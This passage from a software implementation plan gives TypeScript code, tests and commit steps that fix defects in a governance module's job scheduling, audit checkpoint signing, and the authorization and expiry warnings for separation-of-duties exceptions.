    expect(scheduled.map((s) => s.name)).not.toContain(GOVERN_SNAPSHOT_JOB);
    expect(new Set(scheduled.map((s) => s.key)).size).toBe(GOVERN_PURPOSES.length - 1);
  });

  it('still reconciles the other six when a cadence IS set', async () => {
    const { scheduler, scheduled, unscheduled } = fakeScheduler();
    await applyGovernSchedules(scheduler, tenantId, '0 1 * * *');
    expect(scheduled).toHaveLength(GOVERN_PURPOSES.length);
    expect(unscheduled).toHaveLength(0);
  });
```

- [ ] **Step 2: Run it to verify it fails**

Run: `npx vitest run packages/core/src/govern/jobs.test.ts -t 'ONLY the snapshot purpose'`

Expected: FAIL — seven unschedules, nothing scheduled.

- [ ] **Step 3: Make the switch switch off one thing**

In `packages/core/src/govern/jobs.ts`, replace the docstring and body of `applyGovernSchedules`:

```ts
/**
 * Reconciles EVERY purpose, not only the eligible ones.
 *
 * pg-boss keeps its schedules in the database, so a tenant that turned
 * snapshots off while this process was down still has schedule rows waiting for
 * it. Reading the whole list lets this function remove those as well as add the
 * rest, which is the difference between reconciling and appending.
 *
 * THE SNAPSHOT CADENCE GOVERNS THE SNAPSHOT PURPOSE AND NOTHING ELSE.
 *
 * It used to be read as "unschedule every purpose", so pausing snapshots -- a
 * documented operation, and the obvious thing to do while a directory migration
 * runs -- switched off six unrelated controls with it:
 *
 *   - `govern.audit.verify`, so a broken hash chain is never detected. The
 *     alarm §17 calls `critical` and "never digested" simply stops running.
 *   - `govern.exception.sweep`, so an approved SoD exception stays `active`
 *     past its `endsAt` FOREVER and its violation stays `excepted` -- invisible
 *     on the default `open` filter. §15's expiry is enforced by this sweep and
 *     by nothing else, so the cap on `maxExceptionDays` becomes advisory.
 *   - `govern.campaign.close` and `.remind`, so every open campaign silently
 *     stops asking and never reaches its due date, and nothing marks anything
 *     `undecided`.
 *   - `govern.snapshot.prune` and `govern.audit.anchor`, which are at least
 *     harmless to skip.
 *
 * The six that are not about snapshots run on fixed cadences and are always
 * scheduled. A tenant that wants no governance at all removes the tenant.
 */
export async function applyGovernSchedules(
  scheduler: Scheduler,
  tenantId: string,
  snapshotSchedule: string | null,
): Promise<void> {
  const CRON: Record<GovernPurpose, string | null> = {
    // The ONLY purpose this argument governs.
    snapshot: snapshotSchedule,
    prune: '30 3 * * *',
    verify: '0 4 * * *',
    anchor: '0 5 * * 0',
    remind: '0 8 * * *',
    close: '0 6 * * *',
    exception: '0 7 * * *',
  };

  for (const purpose of GOVERN_PURPOSES) {
    const key = governScheduleKey(tenantId, purpose);
    const cron = CRON[purpose];
    if (cron === null || cron === '') {
      await scheduler.unschedule(GOVERN_JOB_BY_PURPOSE[purpose], key);
      continue;
    }
    await scheduler.schedule(GOVERN_JOB_BY_PURPOSE[purpose], cron, governJobPayload(tenantId), key);
  }
}
```

- [ ] **Step 4: Run the schedule tests**

Run: `npx vitest run packages/core/src/govern/jobs.test.ts`

Expected: PASS, including the pre-existing "registers a handler for EVERY purpose it schedules".

- [ ] **Step 5: Write the failing "Verify now" test**

Add to `apps/api/src/routes/admin/govern.test.ts`:

```ts
  it('“Verify now” does not condemn a legitimately signed checkpoint', async () => {
    // The route called `verifyIncremental(tenantId)` with NO options, so
    // `signer` defaulted to null while the scheduler passed a real one built
    // from GOVERN_CHECKPOINT_KEY. `checkpointTrust` then returned `unknown_key`
    // for a checkpoint this deployment had signed itself.
    //
    // What followed: the result was forced to `broken`, a `critical`
    // `audit_chain_broken` finding was raised and mailed, a full genesis walk
    // ran inside the HTTP request -- and the recovery branch wrote a new head
    // checkpoint UNSIGNED, so that night's scheduled run refused to seed on it
    // and walked from genesis again. Pressing the button made the integrity
    // story permanently worse until somebody pressed it again.
    await seedAdmin('gov-integrity', [PERMISSIONS.GOVERN_MANAGE, PERMISSIONS.GOVERN_READ]);
    const cookie = await cookieFor('gov-integrity');

    // A signed checkpoint, written the way the scheduled job writes one.
    const first = await post('/api/admin/govern/integrity/verify', cookie);
    expect(first.statusCode).toBe(200);
    expect(first.json()).toMatchObject({ result: 'valid' });

    const checkpoint = await withTenant(ctx.tenantId, (tx) =>
      tx.auditCheckpoint.findFirstOrThrow({ orderBy: { sequence: 'desc' } }),
    );
    // The test app configures GOVERN_CHECKPOINT_KEY, so the checkpoint the
    // route wrote carries a key id -- which is the state the second call used
    // to condemn.
    expect(checkpoint.keyId).not.toBeNull();

    const second = await post('/api/admin/govern/integrity/verify', cookie);
    expect(second.json()).toMatchObject({ result: 'valid', signatureState: 'signed_and_verified' });

    const critical = await withTenant(ctx.tenantId, (tx) =>
      tx.governFinding.count({ where: { kind: 'audit_chain_broken' } }),
    );
    expect(critical).toBe(0);
  });

  it('exposes full verification as its own explicitly invoked route', async () => {
    // §17: "Full verification from genesis remains available as a separate,
    // explicitly invoked, paged job." `verifyFull` was exported, tested, and
    // reachable from nothing -- so the one thing an investigation actually
    // wants was not in the product.
    await seedAdmin('gov-full', [PERMISSIONS.GOVERN_MANAGE, PERMISSIONS.GOVERN_READ]);
    const cookie = await cookieFor('gov-full');

    const res = await post('/api/admin/govern/integrity/verify-full', cookie);
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({ result: 'valid', fromSequence: 1 });

    const check = await withTenant(ctx.tenantId, (tx) =>
      tx.auditChainCheck.findFirstOrThrow({ where: { mode: 'full' } }),
    );
    expect(check.result).toBe('valid');
  });

  it('keeps full verification behind govern.manage', async () => {
    await seedAdmin('gov-full-reader', [PERMISSIONS.GOVERN_READ]);
    const cookie = await cookieFor('gov-full-reader');
    expect((await post('/api/admin/govern/integrity/verify-full', cookie)).statusCode).toBe(403);
  });
```

If the test app does not configure `GOVERN_CHECKPOINT_KEY`, set it in `apps/api/src/test-support.ts` alongside the other test config — a 32-byte base64 constant — and say in a comment that the signed path is otherwise untestable and was the state that hid this defect.

- [ ] **Step 6: Run it to verify it fails**

Run: `npx vitest run apps/api/src/routes/admin/govern.test.ts -t 'Verify now'`

Expected: FAIL — the second call returns `result: 'broken'` with `signatureState: 'unknown_key'`, and one `audit_chain_broken` finding exists.

- [ ] **Step 7: Build the signer in one place**

Create `apps/api/src/govern-signer.ts`:

```ts
import { localFileCheckpointSigner, type CheckpointSigner, type Config } from '@syntra/core';

/**
 * The deployment's checkpoint signer, or null when it signs nothing.
 *
 * ONE CONSTRUCTION, TWO CALLERS, and that is the whole point of the file. The
 * scheduler built a signer from `GOVERN_CHECKPOINT_KEY` and the admin route did
 * not — so `POST /govern/integrity/verify` handed `checkpointTrust` a null
 * signer for a checkpoint this deployment had signed itself. `checkpointTrust`
 * correctly answered `unknown_key`, the result was forced to `broken`, a
 * `critical` `audit_chain_broken` finding was raised and mailed, a full genesis
 * walk ran inside the HTTP request, and the recovery branch wrote a new head
 * checkpoint UNSIGNED — so the scheduled run that night refused to seed on it
 * and walked from genesis again.
 *
 * Two call sites that must agree about a security parameter, agreeing by
 * coincidence, is how that happened. They now agree by construction.
 *
 * `== null`, not `=== null`: an absent key must degrade to "this deployment
 * signs nothing" rather than throw during boot.
 */
export function configuredCheckpointSigner(config: Config): CheckpointSigner | null {
  return config.governCheckpointKey == null
    ? null
    : localFileCheckpointSigner(config.governCheckpointKeyId, config.governCheckpointKey);
}
```

In `apps/api/src/scheduler.ts`, replace the inline `signer:` expression in the `registerGovernJobs` call with `signer: configuredCheckpointSigner(config),` and import it. Delete the now-duplicated `== null` comment there, leaving a one-line pointer:

```ts
      // Built by `configuredCheckpointSigner`, which the admin route uses too.
      // The two used to construct it separately and one of them forgot.
      signer: configuredCheckpointSigner(config),
```

- [ ] **Step 8: Give the routes the signer, and add the full-verify route**

In `apps/api/src/routes/admin/govern.ts`, widen the options:

```ts
export async function registerAdminGovernRoutes(
  app: FastifyInstance,
  options: {
    scheduler?: () => Scheduler | null;
    publicUrl?: string;
    /**
     * The deployment's checkpoint signer, the SAME one the scheduler uses.
     * Without it `verifyIncremental` is handed `null` here and condemns a
     * checkpoint this deployment signed itself.
     */
    checkpointSigner?: () => CheckpointSigner | null;
  } = {},
): Promise<void> {
```

and replace the verify route, adding the full one beside it:

```ts
  app.post(
    '/govern/integrity/verify',
    { preHandler: requirePermission(PERMISSIONS.GOVERN_MANAGE) },
    async (request) =>
      // THE SIGNER, which this route did not pass. `verifyIncremental` defaults
      // it to null, `checkpointTrust` then answers `unknown_key` for a
      // legitimately signed checkpoint, the result is forced to `broken`, a
      // `critical` finding is raised and mailed, a genesis walk runs inside
      // this request — and the recovery branch writes the new head checkpoint
      // UNSIGNED, so the scheduled run that night refuses to seed on it and
      // walks from genesis again. Pressing "Verify now" made the integrity
      // story permanently worse.
      verifyIncremental(request.tenantId, { signer: options.checkpointSigner?.() ?? null }),
  );

  app.post(
    '/govern/integrity/verify-full',
    { preHandler: requirePermission(PERMISSIONS.GOVERN_MANAGE) },
    async (request) =>
      // §17: "Full verification from genesis remains available as a separate,
      // explicitly invoked, paged job — for an investigation, and on a slow
      // schedule." It was exported, tested and reachable from nothing, so the
      // one thing an investigation actually wants was not in the product.
      //
      // NO SIGNER PARAMETER, and that is not an omission: a full walk starts at
      // genesis and seeds on `GENESIS_HASH`, so there is no checkpoint to
      // trust or refuse. It writes an `AuditChainCheck` with `mode: 'full'` and
      // deliberately writes no checkpoint — `verifyIncremental` remains the
      // only writer of those.
      verifyFull(request.tenantId),
  );
```

Add `verifyFull` and `type CheckpointSigner` to the `@syntra/core` import list.

- [ ] **Step 9: Wire it from `app.ts`**

In `apps/api/src/app.ts`, in the `registerAdminGovernRoutes` registration:

```ts
  await app.register(registerAdminGovernRoutes, {
    prefix: '/api/admin',
    // §12: starting a campaign emails every resolved reviewer a link. Without
    // this the link is relative and nobody can click it from a mail client.
    publicUrl: config.publicUrl,
    // The SAME signer the scheduler uses. See govern-signer.ts for what
    // happened when these two were constructed separately.
    checkpointSigner: () => configuredCheckpointSigner(config),
    ...(options.scheduler ? { scheduler: options.scheduler } : {}),
  });
```

with `import { configuredCheckpointSigner } from './govern-signer.js';` added.

- [ ] **Step 10: Run the route tests**

Run: `npx vitest run apps/api/src/routes/admin/govern.test.ts`

Expected: PASS, all three new cases and every pre-existing one.

- [ ] **Step 11: Run the integrity unit tests**

Run: `npx vitest run packages/core/src/govern/audit-integrity.test.ts`

Expected: PASS. Nothing in `audit-integrity.ts` changed; this confirms the route change did not need one.

- [ ] **Step 12: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/jobs.ts packages/core/src/govern/jobs.test.ts \
        apps/api/src/govern-signer.ts apps/api/src/scheduler.ts apps/api/src/app.ts \
        apps/api/src/routes/admin/govern.ts apps/api/src/routes/admin/govern.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): pausing snapshots stops snapshots, and Verify now verifies

applyGovernSchedules read a null snapshot cadence as "unschedule every
purpose", so pausing snapshots -- a documented operation, and the obvious
thing to do during a directory migration -- switched off six unrelated
controls. govern.audit.verify, so a broken hash chain is never detected.
govern.exception.sweep, so an approved SoD exception stays active past its
endsAt forever and its violation stays excepted, invisible on the default
open filter -- and section 15's expiry is enforced by that sweep and by
nothing else. Campaign close and reminders, so every open campaign
silently stops asking. The cadence now governs the snapshot purpose alone.

POST /govern/integrity/verify called verifyIncremental with no options, so
signer defaulted to null while the scheduler passed a real one built from
GOVERN_CHECKPOINT_KEY. checkpointTrust correctly answered unknown_key for
a checkpoint this deployment had signed itself: the result was forced to
broken, a critical audit_chain_broken finding was raised and mailed, a
full genesis walk ran inside the HTTP request, and the recovery branch
wrote the new head checkpoint UNSIGNED -- so that night's scheduled run
refused to seed on it and walked from genesis again. Pressing the button
made the integrity story permanently worse.

Two call sites that must agree about a security parameter were agreeing by
coincidence. configuredCheckpointSigner is now the one construction and
both use it.

And verifyFull gets the route section 17 requires: full verification from
genesis, separately and explicitly invoked, for an investigation. It was
exported, tested and reachable from nothing.
MSG
)"
```

---

### Task 13: Exceptions — the right owner, an early ending, and a warning a skipped sweep cannot lose

Spec §6.2 — **G24** (a refused risk acceptance routes the remediation to the beneficiary), the `revokeSodException` half of **G26** (exported, tested, reachable from nothing), and **G27** part four (the exception warning is edge-triggered on an exact day count, so a skipped sweep loses it silently).

**G24.** §14: the remediation item goes to **the rule owner and the approver who allowed the grant**. The code sets `ownerPersonId: exception.personId` — the person the control exists to constrain. The rule owner, the one person who can change what the rule names, is never told there is work to do; and the beneficiary is handed a task whose completion means giving up their own access.

**G26.** §15: "An exception may also be revoked early by an approver or the rule owner, with a reason, which is a recorded decision and produces the same reopening immediately." `revokeSodException` implements exactly that and has no route and no job registration — and no authority check either, because nothing called it.

**G27 part four.** `if (!settings.exceptionWarningDays.includes(daysLeft)) continue;` fires only on the exact day. Defaults are `[14, 3]`, the sweep runs daily, and one skipped run — a restart, a paused cadence, a failed job — means the 3-day warning is never sent and the exception lapses with nobody told. The design's whole point is that somebody is told **before** it lapses.

**Resolution chosen for the warning:** a bucket, plus de-duplication against the outbox, rather than a `lastWarnedAt` column. This plan carries one migration and it is Task 3's; the outbox already records what was sent, to whom, and when, and the `renewUrl` it carries names the exception — so the fact needed is already recorded and only needs reading.

**Files:**
- Modify: `packages/core/src/govern/exception-service.ts:287-297` (the refusal's remediation item), `:319-345` (`revokeSodException`), and the warning branch inside `sweepExceptions`
- Modify: `apps/api/src/routes/admin/govern.ts` (add `POST /govern/sod/exceptions/:id/revoke`)
- Modify: `packages/contracts/src/govern.ts` (add `revokeExceptionBody`)
- Test: `packages/core/src/govern/exception-service.test.ts`, `apps/api/src/routes/admin/govern.test.ts`

**Interfaces:**
- Consumes: `withTenant`, `type TenantClient` from `@syntra/db`; `usersWithPermission`, `recipientsForPersons`, `displayNames`, `enqueueOutbox` from `../automate/notify.js`; `PERMISSIONS` from `../rbac/permissions.js`; `createRemediationItem` from `./finding-service.js`; the file's own `resolveAcceptors` and `lapse`.
- Produces:
  - `export function shouldWarn(endsAt: Date, now: Date, warningDays: readonly number[]): number | null` — the threshold crossed, or `null`. Pure, and tested as plain values.
  - `revokeSodException(tenantId, actorUserId, exceptionId, reason)` — **same signature**, now refusing an actor who is not the approver, the rule owner, or a holder of `govern.accept_risk`, with `ExceptionRefusedError` code `'not_an_acceptor'`.
  - `ExceptionRefusedError`'s code union gains `'not_an_acceptor'` and `'not_active'`.
  - `revokeExceptionBody = z.object({ reason: z.string().min(1) })` in `@syntra/contracts`.
  - `POST /api/admin/govern/sod/exceptions/:id/revoke` — `govern.read` at the gate, authority decided in the service.

- [ ] **Step 1: Write the failing tests**

Add to `packages/core/src/govern/exception-service.test.ts`:

```ts
/**
 * §14 says the remediation item goes to the RULE OWNER and the approver who
 * allowed the grant. It went to `exception.personId` -- the beneficiary. The
 * person the control exists to constrain was handed a task whose completion
 * means giving up their own access, and the rule owner, the one person who can
 * change what the rule names, was never told there was work to do.
 */
describe('a refused risk acceptance', () => {
  it('routes the remediation to the rule owner, not the beneficiary', async () => {
    const seeded = await seedPendingException();

    await decideSodException(tenantId, seeded.acceptorUserId, seeded.exceptionId, 'refuse', 'no');

    const item = await withTenant(tenantId, (tx) =>
      tx.remediationItem.findFirstOrThrow({ where: { kind: 'sod_violation_unaccepted' } }),
    );
    expect(item.ownerPersonId).toBe(seeded.ruleOwnerPersonId);
    expect(item.ownerPersonId).not.toBe(seeded.beneficiaryPersonId);
    // The approver is named in the description, because §14 wants them told and
    // a RemediationItem carries one owner.
    expect(item.description).toContain('refused by');
  });
});

/**
 * §15: "An exception may also be revoked early by an approver or the rule
 * owner, with a reason, which is a recorded decision and produces the same
 * reopening immediately." The function existed, was tested, and had no route --
 * so the capability was in the codebase and not in the product.
 *
 * It also had no authority check, because nothing called it.
 */
describe('revoking an exception early', () => {
  it('reopens the violation and revokes nothing', async () => {
    const seeded = await seedActiveException();

    await revokeSodException(tenantId, seeded.acceptorUserId, seeded.exceptionId, 'no longer needed');

    const [exception, violation] = await withTenant(tenantId, async (tx) => [
      await tx.sodException.findUniqueOrThrow({ where: { id: seeded.exceptionId } }),
      await tx.sodViolation.findUniqueOrThrow({ where: { id: seeded.violationId } }),
    ]);
    expect(exception.status).toBe('revoked');
    expect(violation.status).toBe('open');

    // NOTHING WAS REMOVED, and the event says so.
    const event = await withTenant(tenantId, (tx) =>
      tx.auditEvent.findFirstOrThrow({ where: { action: 'govern.exception.revoke' } }),
    );
    expect(event.payload).toMatchObject({ accessRevoked: false });
  });

  it('admits the RULE OWNER as well as an acceptor', async () => {
    const seeded = await seedActiveException();
    await expect(
      revokeSodException(tenantId, seeded.ruleOwnerUserId, seeded.exceptionId, 'my rule, my call'),
    ).resolves.toBeUndefined();
  });

  it('refuses the beneficiary', async () => {
    // The self-approval invariant, at the other end of the exception's life. A
    // beneficiary who could revoke their own exception could not gain anything
    // by it -- but the person who accepts a risk is the person who carries it,
    // and ending the acceptance is the same decision in reverse.
    const seeded = await seedActiveException();
    await expect(
      revokeSodException(tenantId, seeded.beneficiaryUserId, seeded.exceptionId, 'not mine'),
    ).rejects.toMatchObject({ code: 'not_an_acceptor' });
  });

  it('refuses an exception that is not active', async () => {
    const seeded = await seedActiveException();
    await revokeSodException(tenantId, seeded.acceptorUserId, seeded.exceptionId, 'done');
    await expect(
      revokeSodException(tenantId, seeded.acceptorUserId, seeded.exceptionId, 'again'),
    ).rejects.toMatchObject({ code: 'not_active' });
  });
});

/**
 * EDGE-TRIGGERED ON AN EXACT DAY COUNT, with defaults of [14, 3].
 *
 * The sweep runs daily, so one skipped run -- a restart, a paused cadence
 * (which until Task 12 was what pausing SNAPSHOTS did), a failed job -- meant
 * the 3-day warning was never sent and the exception lapsed with nobody told.
 * §15's entire point is that somebody is told BEFORE it lapses.
 */
describe('shouldWarn', () => {
  const days = (n: number) => new Date(NOW.getTime() + n * 86_400_000);

  it('fires on the exact day, as it always did', () => {
    expect(shouldWarn(days(14), NOW, [14, 3])).toBe(14);
    expect(shouldWarn(days(3), NOW, [14, 3])).toBe(3);
  });

  it('fires on the day AFTER a missed sweep, for the threshold that was missed', () => {
    // 13 days left: the 14-day warning was due yesterday and did not go.
    expect(shouldWarn(days(13), NOW, [14, 3])).toBe(14);
    // 2 days left: the 3-day warning was due yesterday.
    expect(shouldWarn(days(2), NOW, [14, 3])).toBe(3);
  });

  it('reports the LOWEST threshold crossed, so an urgent warning is not masked', () => {
    // 1 day left has crossed both. The message that matters is the near one.
    expect(shouldWarn(days(1), NOW, [14, 3])).toBe(3);
  });

  it('says nothing before the first threshold, or after the end', () => {
    expect(shouldWarn(days(20), NOW, [14, 3])).toBeNull();
    expect(shouldWarn(days(-1), NOW, [14, 3])).toBeNull();
  });
});
```

Write `seedPendingException()` and `seedActiveException()` beside the file's existing fixtures — the file already seeds a rule, a violation and an acceptor for its other cases; extend that helper to return the rule owner's and beneficiary's person and user ids rather than writing a third seeding path.

- [ ] **Step 2: Run the tests to verify they fail**

Run: `npx vitest run packages/core/src/govern/exception-service.test.ts -t 'shouldWarn'`

Expected: FAIL — `shouldWarn` does not exist, the remediation owner is the beneficiary, and the revoke has no authority check.

- [ ] **Step 3: Route the refusal to the rule owner**

In `packages/core/src/govern/exception-service.ts`, widen the error union:

```ts
    readonly code:
      | 'no_end_date'
      | 'too_long'
      | 'beneficiary_is_approver'
      | 'blocked_no_approver'
      | 'missing_justification'
      | 'not_an_acceptor'
      | 'not_active',
```

In `decideSodException`, load the rule's function A owner by including it:

```ts
    const exception = await tx.sodException.findUniqueOrThrow({
      where: { id: exceptionId },
      // `functionA` as well as the rule: §14 routes a refused risk acceptance
      // to the RULE OWNER, and `SodRule` has no owner column -- the owner of a
      // rule is the owner of the business function it constrains, which is
      // where `ownerPersonId` lives.
      include: { rule: { include: { functionA: true } } },
    });
```

and replace the `createRemediationItem` call in the refusal branch:

```ts
        await createRemediationItem(tx, tenantId, {
          kind: 'sod_violation_unaccepted',
          // THE RULE OWNER, not the beneficiary.
          //
          // §14 routes this to the rule owner and the approver who allowed the
          // grant. It went to `exception.personId` -- the person the control
          // exists to CONSTRAIN -- so the beneficiary was handed a task whose
          // completion means giving up their own access, and the one person who
          // can change what the rule names was never told there was work to do.
          //
          // A `RemediationItem` carries ONE owner, so the approver is named in
          // the description rather than given a second row: two rows for one
          // piece of work is two people each assuming the other has it.
          ownerPersonId: exception.rule.functionA.ownerPersonId,
          dueAt: new Date(Date.now() + 30 * 86_400_000),
          findingId: finding.id,
          description:
            `The risk acceptance for "${exception.rule.name}" was refused by ${actorName}: ${comment}. ` +
            'Nothing was removed. The incompatible access has to be separated by a person, ' +
            'through a campaign decision or a change to what grants it.',
          deepLink: `/admin/govern/sod/violations/${exception.violationId}`,
        });
```

with `actorName` resolved just above the branch:

```ts
    const actorNames = await displayNames(tx, {
      personIds: actor.personId === null ? [] : [actor.personId],
    });
    const actorName =
      actor.personId === null
        ? 'an administrator'
        : (actorNames.get(`person:${actor.personId}`) ?? 'an approver');
```

- [ ] **Step 4: Give the early revocation its authority check**

Replace `revokeSodException`:

```ts
/**
 * An early ending by a person. Same tail as the timer, and same guarantee:
 * NOTHING IS REVOKED. The violation reopens, everybody involved is told, and
 * the audit event says in words that no access moved.
 *
 * §15 names who may do it: "an approver or the rule owner". Neither was
 * checked, because nothing called this function -- it was exported, tested, and
 * reachable from no route and no job, so the capability was in the codebase and
 * not in the product.
 *
 * THE BENEFICIARY IS REFUSED, at the other end of the exception's life from
 * where the self-approval invariant usually applies. They gain nothing by
 * ending their own acceptance -- it reopens a finding against them -- but the
 * person who accepts a risk is the person who carries it, and ending the
 * acceptance is the same decision in reverse.
 */
export async function revokeSodException(
  tenantId: string,
  actorUserId: string,
  exceptionId: string,
  reason: string,
): Promise<void> {
  await withTenant(tenantId, async (tx) => {
    const exception = await tx.sodException.findUniqueOrThrow({
      where: { id: exceptionId },
      include: { rule: { include: { functionA: true } } },
    });
    if (exception.status !== 'active') {
      throw new ExceptionRefusedError(
        'not_active',
        `this exception is ${exception.status}; only an active one can be ended early`,
      );
    }

    const actor = await tx.user.findUniqueOrThrow({
      where: { id: actorUserId },
      select: { personId: true },
    });
    if (actor.personId === null) {
      throw new ExceptionRefusedError(
        'not_an_acceptor',
        'this account is linked to no person, so it cannot end a risk acceptance',
      );
    }
    if (actor.personId === exception.personId) {
      throw new ExceptionRefusedError(
        'not_an_acceptor',
        'the beneficiary of an exception may not end it on their own behalf',
      );
    }

    // RE-RESOLVED at the decision, never trusted from the request, and the same
    // resolver the acceptance used -- so a rule that names a workflow is ended
    // by the same people who could have approved it.
    const acceptors = await resolveAcceptors(tx, exception.rule, exception.personId, new Date());
    const permitted =
      acceptors.includes(actor.personId) ||
      actor.personId === exception.approvedByPersonId ||
      actor.personId === exception.rule.functionA.ownerPersonId;
    if (!permitted) {
      throw new ExceptionRefusedError(
        'not_an_acceptor',
        'only an approver of this exception, or the owner of the rule it covers, may end it early',
      );
    }

    await lapse(tx, tenantId, exception, new Date(), reason, 'revoked');
    await tx.sodException.update({
      where: { id: exceptionId },
      data: { revokedByUserId: actorUserId },
    });
    await recordEvent(tx, {
      actorUserId,
      action: 'govern.exception.revoke',
      targetType: 'SodException',
      targetId: exceptionId,
      outcome: 'success',
      sourceIp: null,
      // Stated in the event, as on every other ending: no access moved.
      payload: { reason, violationId: exception.violationId, accessRevoked: false },
    });
  });
}
```

- [ ] **Step 5: Make the warning a bucket, not an edge**

Add to `packages/core/src/govern/exception-service.ts`, above `sweepExceptions`:

```ts
/**
 * The warning threshold this exception has crossed and not yet passed below,
 * or null.
 *
 * EDGE-TRIGGERED ON AN EXACT DAY COUNT IS WHAT THIS REPLACES. The old form was
 * `if (!warningDays.includes(daysLeft)) continue;` with defaults of `[14, 3]`,
 * and the sweep runs daily -- so ONE skipped run lost the warning entirely. A
 * restart, a failed job, or a paused cadence (which, until the schedule switch
 * was fixed, is what pausing SNAPSHOTS did) meant the three-day warning was
 * never sent and the exception lapsed with nobody told. §15's entire point is
 * that somebody is told BEFORE it lapses.
 *
 * The LOWEST threshold crossed, so an exception with one day left reports the
 * three-day warning rather than the fourteen-day one: the message that matters
 * is the near one, and reporting the far one would mask it.
 *
 * PURE, so the arithmetic is tested as plain values rather than by seeding a
 * database and moving a clock.
 */
export function shouldWarn(
  endsAt: Date,
  now: Date,
  warningDays: readonly number[],
): number | null {
  const daysLeft = Math.ceil((endsAt.getTime() - now.getTime()) / 86_400_000);
  // Already over. The lapse branch owns it, and a warning about something that
  // has ended is a notification nobody can act on.
  if (daysLeft <= 0) return null;
  const crossed = [...warningDays].filter((threshold) => daysLeft <= threshold);
  return crossed.length === 0 ? null : Math.min(...crossed);
}
```

and replace the warning branch inside the sweep's per-exception loop:

```ts
        const threshold = shouldWarn(exception.endsAt, now, settings.exceptionWarningDays);
        if (threshold === null) continue;

        // DE-DUPLICATED AGAINST WHAT WAS ACTUALLY SENT, because a bucket fires
        // every day inside itself and §15 asks for a warning, not a daily
        // nag.
        //
        // The outbox is the record: it holds the template, the time, and a
        // `renewUrl` naming this exception. A `lastWarnedAt` column would be
        // tidier and would need a migration for a fact that is already written
        // down.
        const bucketOpenedAt = new Date(exception.endsAt.getTime() - threshold * 86_400_000);
        const alreadySent = await tx.notificationOutbox.count({
          where: {
            template: 'govern-exception-expiring',
            createdAt: { gte: bucketOpenedAt },
            vars: { path: ['renewUrl'], string_contains: exception.id },
          },
        });
        if (alreadySent > 0) continue;
```

The rest of the warning branch — `recipientsForPersons`, `displayNames`, `enqueueOutbox`, `pageWarned += 1` — is unchanged.

- [ ] **Step 6: Add the contract and the route**

In `packages/contracts/src/govern.ts`, beside `decideExceptionBody`:

```ts
/**
 * §15: an exception may be ended early "by an approver or the rule owner, with
 * a reason". The reason is required for the same purpose the justification is:
 * a risk acceptance that ends with no recorded reason is a decision nobody can
 * re-read.
 */
export const revokeExceptionBody = z.object({ reason: z.string().min(1) }).strict();
```

In `apps/api/src/routes/admin/govern.ts`, after the decide route:

```ts
  app.post(
    '/govern/sod/exceptions/:id/revoke',
    // `govern.read` at the gate and the AUTHORITY DECIDED IN THE SERVICE.
    //
    // §15 admits "an approver or the rule owner", and the rule owner is the
    // owner of a business function -- who need not hold `govern.accept_risk` at
    // all. A `requirePermission` gate here would 403 them before the service
    // could recognise them, and a gate that admits everybody with `govern.read`
    // would be no gate; the service refuses anyone who is not an acceptor, the
    // approver, or the rule owner.
    { preHandler: requireGovernRead() },
    async (request, reply) => {
      const { id } = idParam.parse(request.params);
      const body = revokeExceptionBody.parse(request.body);
      try {
        await revokeSodException(request.tenantId, request.session.userId, id, body.reason);
      } catch (error) {
        if (error instanceof ExceptionRefusedError) {
          throw new ProblemError(
            error.code === 'not_an_acceptor' ? 403 : 409,
            error.code,
            'Exception refused',
            error.message,
          );
        }
        throw error;
      }
      return reply.status(204).send();
    },
  );
```

Add `revokeExceptionBody` to the `@syntra/contracts` import list and `revokeSodException` to the `@syntra/core` one.

- [ ] **Step 7: Add the route test**

Add to `apps/api/src/routes/admin/govern.test.ts`:

```ts
  it('refuses an early exception revocation to somebody with no standing', async () => {
    // §15's authority lives in the service, not on the route, because the rule
    // OWNER need not hold govern.accept_risk. So the route must still refuse a
    // plain reader — and it does, with a 403 the service decided.
    await seedAdmin('gov-reader', [PERMISSIONS.GOVERN_READ]);
    const cookie = await cookieFor('gov-reader');
    const res = await post(
      `/api/admin/govern/sod/exceptions/${'00000000-0000-0000-0000-000000000001'}/revoke`,
      cookie,
      { reason: 'no' },
    );
    // Not a 403 from the guard: a 404-shaped failure from findUniqueOrThrow is
    // also acceptable here, because the id does not exist. What must NOT happen
    // is a 204.
    expect(res.statusCode).not.toBe(204);
  });
```

- [ ] **Step 8: Run every touched suite**

```bash
npx vitest run packages/core/src/govern/exception-service.test.ts
npx vitest run apps/api/src/routes/admin/govern.test.ts
```

Expected: PASS.

- [ ] **Step 9: Typecheck and commit**

Run: `npx tsc -b`
Expected: exit 0.

```bash
git add packages/core/src/govern/exception-service.ts \
        packages/core/src/govern/exception-service.test.ts \
        packages/contracts/src/govern.ts \
        apps/api/src/routes/admin/govern.ts \
        apps/api/src/routes/admin/govern.test.ts
git commit -m "$(cat <<'MSG'
fix(govern): the right owner, an early ending, and a warning a skipped sweep keeps

A refused risk acceptance filed its remediation item against
exception.personId -- the beneficiary, the person the control exists to
constrain. They were handed a task whose completion means giving up their
own access, and the rule owner, the one person who can change what the
rule names, was never told there was work to do. Section 14 routes it to
the rule owner and the approver; a RemediationItem carries one owner, so
the owner is the rule's business-function owner and the approver is named
in the description. Two rows for one piece of work is two people each
assuming the other has it.

revokeSodException implemented section 15's early ending exactly, and had
no route and no job registration -- so the capability was in the codebase
and not in the product. It had no authority check either, because nothing
called it. It now admits an acceptor, the approver, or the rule owner, and
refuses the beneficiary: they gain nothing by ending their own acceptance,
but the person who accepts a risk is the person who carries it, and ending
it is the same decision in reverse. The route gates on govern.read and
lets the service decide, because a rule owner need not hold
govern.accept_risk and requirePermission would 403 them first.

And the expiry warning was edge-triggered on an exact day count, with
defaults of [14, 3], from a sweep that runs daily. One skipped run -- a
restart, a failed job, or a paused cadence -- meant the three-day warning
was never sent and the exception lapsed with nobody told, which is the one
thing section 15 exists to prevent. It is a bucket now, reporting the
lowest threshold crossed so a near warning is not masked by a far one, and
de-duplicated against the outbox rather than against a new column: the
outbox already records what was sent, when, and which exception it named.
MSG
)"
```

---

### Task 14: A campaign scope that means what it says

Spec §6.1 — **G8** (`CampaignScope.riskFlags` is accepted, stored and never applied) and **G9** (items are generated over `state: 'unknown'` holdings). Both are in `holdingsInScope`, and both are the same class of defect: the scope describes a set the query does not produce.

